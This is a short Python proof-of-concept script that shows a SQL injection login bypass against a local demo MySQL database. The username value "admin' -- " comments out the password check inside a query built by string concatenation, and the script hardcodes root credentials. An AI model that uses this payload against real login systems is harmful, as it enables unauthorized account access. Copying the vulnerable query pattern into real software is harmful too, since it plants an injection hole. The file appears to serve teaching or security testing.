# code/poc_login.py
import pymysql

conn = pymysql.connect(host='127.0.0.1', user='root', password='mys123', db='sqli_demo', charset='utf8mb4', port=3306)
cur = conn.cursor()

username = "admin' -- "
password = "irrelevant"

vuln_query = "SELECT id, role FROM users WHERE username = '" + username + "' AND password = '" + password + "';"
print("VULN QUERY:", vuln_query)

try:
    cur.execute(vuln_query)
    rows = cur.fetchall()
    print("ROWS RETURNED:", rows)
    if rows:
        print("Login bypass successful.")
    else:
        print("No rows returned.")
except Exception as e:
    print("Error executing query:", e)

cur.close()
conn.close()
